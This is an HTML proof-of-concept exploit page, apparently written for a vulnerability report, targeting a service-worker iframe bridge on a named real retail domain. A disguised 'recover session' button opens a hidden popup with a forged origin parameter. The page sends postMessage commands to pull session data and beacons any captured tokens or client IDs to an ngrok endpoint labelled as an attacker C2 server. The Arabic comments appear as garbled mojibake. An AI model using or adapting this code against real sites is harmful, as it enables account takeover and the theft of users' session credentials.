<!DOCTYPE html>
<html>
<head>
    <title>PoC: Zooplus Identity Theft</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <h2>[!] Exploit Status: <span id="status">Waiting for User Interaction...</span></h2>
    <button id="startAttack" style="padding:15px; background:red; color:white; font-weight:bold; cursor:pointer;">
        CLICK TO RECOVER SESSION
    </button>
    <div id="logs" style="margin-top:20px; border:1px dashed #0f0; padding:10px;"></div>

    <script>
        const logs = document.getElementById('logs');
        const status = document.getElementById('status');
        
        function log(msg) {
            logs.innerHTML += `> ${msg}<br>`;
            console.log(msg);
        }

        document.getElementById('startAttack').onclick = function() {
            log("Opening Targeted Popup...");
            // Ù†ÙØªØ­ ØµÙØ­Ø© Ø§Ù„Ø¬Ø³Ø± Ø§Ù„ØªÙŠ Ø¨Ù‡Ø§ Ø«ØºØ±Ø© Ø§Ù„Ù€ Origin Parameter
            // Ù†Ù…Ø±Ø± Ø±Ø§Ø¨Ø· ØµÙØ­ØªÙ†Ø§ ÙƒÙ€ "Origin" Ù…ÙˆØ«ÙˆÙ‚
            const targetUrl = "https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=" + encodeURIComponent(window.location.origin);
            const popup = window.open(targetUrl, "zooplus_bridge", "width=1,height=1,left=-1000,top=-1000");

            status.innerText = "Attack in Progress...";

            // Ø§Ù„ØªÙ†ØµØª Ø¹Ù„Ù‰ Ø§Ù„Ø±Ø¯ Ø§Ù„Ù‚Ø§Ø¯Ù… Ù…Ù† Ø§Ù„Ø¬Ø³Ø±
            window.addEventListener("message", function(event) {
                // Ø§Ù„ØªØ£ÙƒØ¯ Ø£Ù† Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù‚Ø§Ø¯Ù…Ø© Ù…Ù† Ù†Ø·Ø§Ù‚ Zooplus
                if (event.origin.includes("zooplus.com")) {
                    log("ðŸ”“ DATA EXFILTRATED: " + JSON.stringify(event.data));
                    
                    if (event.data.clientId || event.data.token) {
                        status.innerText = "SUCCESS: DATA STOLEN!";
                        status.style.color = "red";
                        
                        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ù…Ù‡Ø§Ø¬Ù…
                        log("Sending captured credentials to attacker C2 server...");
                        navigator.sendBeacon("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/collect", JSON.stringify(event.data));
                    }
                }
            }, false);

            // Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ù„Ù„Ø¬Ø³Ø± Ù„Ø¥Ø¬Ø¨Ø§Ø± Ø§Ù„Ù€ EventBus Ø¹Ù„Ù‰ Ø¨Ø« Ø§Ù„ØªÙˆÙƒÙ†
            setTimeout(() => {
                log("Injecting Command to Bridge...");
                popup.postMessage({ type: "GET_SESSION_INFO" }, "*");
                
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø£Ø®Ø±Ù‰ Ù„Ø§ØµØ·ÙŠØ§Ø¯ Ø§Ù„Ù€ Auth Success Event
                popup.postMessage({ type: "AUTH-SUCCESS-EVENT-v1" }, "*");
            }, 3000);
        };
    </script>
</body>
</html>
